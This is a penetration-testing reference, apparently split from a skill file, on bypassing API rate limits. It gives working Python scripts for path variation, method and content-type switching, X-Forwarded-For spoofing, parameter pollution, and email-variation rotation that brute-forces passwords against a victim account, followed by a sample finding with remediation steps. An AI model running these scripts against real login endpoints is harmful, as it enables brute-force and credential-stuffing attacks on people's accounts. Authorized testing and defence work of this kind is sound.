# performing-api-rate-limiting-bypass — 详细参考（由 SKILL.md 拆分）

### Step 3: Endpoint Variation Bypass

```python
# Bypass Technique 2: URL path variation
def test_path_variation_bypass(base_endpoint, token):
    """Test if path variations bypass rate limit tied to specific endpoint."""
    variations = [
        base_endpoint,                          # /api/v1/auth/login
        base_endpoint + "/",                    # /api/v1/auth/login/
        base_endpoint.upper(),                  # /API/V1/AUTH/LOGIN
        base_endpoint + "?dummy=1",             # /api/v1/auth/login?dummy=1
        base_endpoint + "#fragment",            # /api/v1/auth/login#fragment
        base_endpoint + "%20",                  # /api/v1/auth/login%20
        base_endpoint + "/..",                  # /api/v1/auth/login/..
        base_endpoint.replace("/v1/", "/v2/"),  # /api/v2/auth/login
        base_endpoint + ";",                    # /api/v1/auth/login;
        base_endpoint + "\t",                   # Tab character
        base_endpoint + "%00",                  # Null byte
        base_endpoint + "..;/",                 # Spring path traversal
    ]

    # Trigger rate limit on original endpoint first
    for i in range(200):
        resp = requests.post(f"{BASE_URL}{base_endpoint}",
                           headers={"Authorization": f"Bearer {token}"},
                           json={"username": "test", "password": "wrong"})
        if resp.status_code == 429:
            break

    # Test variations
    for variant in variations:
        try:
            resp = requests.post(f"{BASE_URL}{variant}",
                               headers={"Authorization": f"Bearer {token}"},
                               json={"username": "test", "password": "wrong"})
            if resp.status_code != 429:
                print(f"[BYPASS] Path variation: {variant} -> {resp.status_code}")
        except Exception:
            pass

test_path_variation_bypass("/auth/login", "<token>")
```

### Step 4: HTTP Method and Content-Type Bypass

```python
# Bypass Technique 3: Method and content-type switching
def test_method_bypass(endpoint, original_body):
    """Test if rate limit is method-specific."""
    methods_to_test = ["POST", "PUT", "PATCH", "GET", "OPTIONS"]

    content_types = [
        "application/json",
        "application/x-www-form-urlencoded",
        "multipart/form-data",
        "text/plain",
        "application/xml",
        "text/xml",
    ]

    # Trigger rate limit with POST + application/json
    for i in range(200):
        resp = requests.post(f"{BASE_URL}{endpoint}",
                           headers={**headers, "Content-Type": "application/json"},
                           json=original_body)
        if resp.status_code == 429:
            break

    # Test other methods
    for method in methods_to_test:
        if method == "POST":
            continue
        resp = requests.request(method, f"{BASE_URL}{endpoint}",
                              headers=headers, json=original_body)
        if resp.status_code not in (429, 405):
            print(f"[BYPASS] Method switch to {method}: {resp.status_code}")

    # Test other content types
    for ct in content_types:
        if ct == "application/json":
            continue
        test_headers = {**headers, "Content-Type": ct}
        if ct == "application/x-www-form-urlencoded":
            data = "&".join(f"{k}={v}" for k, v in original_body.items())
            resp = requests.post(f"{BASE_URL}{endpoint}", headers=test_headers, data=data)
        else:
            resp = requests.post(f"{BASE_URL}{endpoint}", headers=test_headers,
                               data=str(original_body))
        if resp.status_code != 429:
            print(f"[BYPASS] Content-Type {ct}: {resp.status_code}")

test_method_bypass("/auth/login", {"username": "test@example.com", "password": "wrong"})
```

### Step 5: Account-Level Bypass Techniques

```python
# Bypass Technique 4: Rotate identifiers to avoid per-account limits
import string
import random

def test_account_rotation_bypass(login_endpoint, target_password_list):
    """Test if rate limit is per-account, bypassed by rotating usernames."""
    target_email = "victim@example.com"

    # Test 1: Per-account rate limit bypass by rotating the username field
    # with slight variations
    email_variations = [
        target_email,
        target_email.upper(),
        f" {target_email}",
        f"{target_email} ",
        target_email.replace("@", "%40"),
        f"+tag@".join(target_email.split("@")),  # victim+tag@example.com
    ]

    for password in target_password_list[:50]:
        for email_var in email_variations:
            resp = requests.post(f"{BASE_URL}{login_endpoint}",
                               json={"username": email_var, "password": password})
            if resp.status_code == 200:
                print(f"[SUCCESS] Logged in with: {email_var} / {password}")
                return True
            elif resp.status_code == 429:
                print(f"Rate limited on variation: {email_var}")
            # Small delay
            time.sleep(0.1)

    return False

# Bypass Technique 5: Parameter pollution
def test_parameter_pollution_bypass(endpoint):
    """Add extra parameters to make each request appear unique."""
    for i in range(200):
        random_param = ''.join(random.choices(string.ascii_lowercase, k=8))
        resp = requests.post(
            f"{BASE_URL}{endpoint}?{random_param}={i}",
            headers=headers,
            json={"username": "test@example.com", "password": f"attempt_{i}"}
        )
        if resp.status_code == 429:
            print(f"Parameter pollution failed at request {i+1}")
            return False
    print("[BYPASS] Parameter pollution: 200 requests without rate limit")
    return True
```

### Step 6: Distributed and Async Testing

```python
import asyncio
import aiohttp

async def distributed_rate_limit_test(endpoint, total_requests=1000, concurrency=50):
    """Test rate limiting under concurrent load."""
    results = {"success": 0, "rate_limited": 0, "errors": 0}

    async def make_request(session, request_num):
        try:
            # Rotate X-Forwarded-For per request
            req_headers = {
                **headers,
                "X-Forwarded-For": f"192.168.{request_num % 256}.{(request_num * 3) % 256}"
            }
            async with session.post(
                f"{BASE_URL}{endpoint}",
                headers=req_headers,
                json={"username": "test@example.com", "password": f"attempt_{request_num}"}
            ) as resp:
                if resp.status == 429:
                    results["rate_limited"] += 1
                elif resp.status in (200, 401):
                    results["success"] += 1
                else:
                    results["errors"] += 1
        except Exception:
            results["errors"] += 1

    connector = aiohttp.TCPConnector(limit=concurrency)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [make_request(session, i) for i in range(total_requests)]
        await asyncio.gather(*tasks)

    print(f"\nDistributed Test Results:")
    print(f"  Successful: {results['success']}")
    print(f"  Rate Limited: {results['rate_limited']}")
    print(f"  Errors: {results['errors']}")
    print(f"  Bypass Rate: {results['success']/(results['success']+results['rate_limited'])*100:.1f}%")

# asyncio.run(distributed_rate_limit_test("/auth/login"))
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Rate Limiting** | Controlling the number of requests a client can make to an API within a time window, typically enforced per IP, per user, or per API key |
| **Unrestricted Resource Consumption** | OWASP API4:2023 - APIs that do not properly limit the size or number of resources requested, enabling DoS or brute force attacks |
| **X-Forwarded-For Spoofing** | Manipulating the X-Forwarded-For header to make the server believe requests originate from different IP addresses, bypassing IP-based rate limits |
| **Credential Stuffing** | Automated injection of stolen username/password pairs against login endpoints, requiring rate limit bypass for large-scale attacks |
| **Token Bucket** | Rate limiting algorithm that allows bursts of requests up to a bucket size, refilling at a constant rate |
| **Sliding Window** | Rate limiting algorithm that tracks requests in a rolling time window, more resistant to burst attacks than fixed windows |

## Tools & Systems

- **Burp Suite Turbo Intruder**: High-performance request sender for rate limit testing using Python-based scripting engine
- **ffuf**: Fast web fuzzer capable of testing rate limits with configurable request rates and header manipulation
- **wfuzz**: Web fuzzer with support for header injection, parameter fuzzing, and rate limit evasion techniques
- **Postman Collection Runner**: Automated collection execution with variable rotation for rate limit bypass testing
- **Gatling/k6**: Load testing tools that simulate realistic traffic patterns to test rate limiting under production-like conditions

## Common Scenarios

### Scenario: Login API Rate Limit Bypass Assessment

**Context**: A financial services API implements rate limiting on the login endpoint to prevent brute force attacks. The security team wants to verify the effectiveness of these controls before a compliance audit.

**Approach**:
1. Baseline: Send 100 requests to `POST /api/v1/auth/login` - rate limited at request 10 per minute per IP
2. Test X-Forwarded-For rotation: Send 100 requests with unique X-Forwarded-For values - rate limit bypassed (all requests return 401, not 429)
3. Test path variation: `/api/v1/auth/login/` (trailing slash) resets the rate limit counter
4. Test API versioning: `/api/v2/auth/login` has no rate limiting configured (shadow API)
5. Test parameter pollution: Adding `?_=<random>` to each request bypasses the rate limit
6. Test concurrent requests: 50 simultaneous requests from same IP - 45 succeed before rate limit kicks in (race condition in counter)
7. Determine that rate limiting is implemented at the nginx reverse proxy level using IP-only tracking, trusting X-Forwarded-For header without validation

**Pitfalls**:
- Sending too many requests too fast and causing actual denial of service to the test environment
- Not testing rate limits on password reset, MFA verification, and account enumeration endpoints
- Assuming the rate limit applies globally when it may be per-endpoint or per-method only
- Missing race conditions in rate limit counters that allow burst bypasses
- Not testing both authenticated and unauthenticated rate limiting separately

## Output Format

```
## Finding: Rate Limiting Bypass via X-Forwarded-For Header Spoofing

**ID**: API-RATE-001
**Severity**: High (CVSS 7.3)
**OWASP API**: API4:2023 - Unrestricted Resource Consumption
**Affected Endpoints**:
  - POST /api/v1/auth/login
  - POST /api/v1/auth/forgot-password
  - POST /api/v1/auth/verify-mfa

**Description**:
The API rate limiting implementation relies on the X-Forwarded-For header
to identify client IP addresses. Since the application sits behind a load
balancer that does not strip or validate this header, an attacker can set
arbitrary X-Forwarded-For values to bypass the 10 requests/minute rate limit
on authentication endpoints.

**Bypass Methods Confirmed**:
1. X-Forwarded-For rotation: 1000 login attempts in 60 seconds (vs 10 limit)
2. Trailing slash path variation: /auth/login/ treated as separate endpoint
3. API v2 endpoint: No rate limiting configured
4. Race condition: 50 concurrent requests, 45 succeed before counter updates

**Impact**:
An attacker can perform unlimited brute force attacks against any user
account, bypassing the rate limit designed to prevent credential stuffing.
At 1000 attempts per minute, a 6-digit PIN can be brute-forced in under
17 minutes.

**Remediation**:
1. Configure the load balancer to set X-Forwarded-For and strip client-provided values
2. Implement rate limiting at the application layer using authenticated user ID, not just IP
3. Normalize URL paths before applying rate limit rules (strip trailing slashes, enforce lowercase)
4. Apply rate limits consistently across all API versions and content types
5. Use atomic rate limit counters (Redis INCR) to prevent race conditions
6. Implement progressive delays (exponential backoff) in addition to hard limits
```
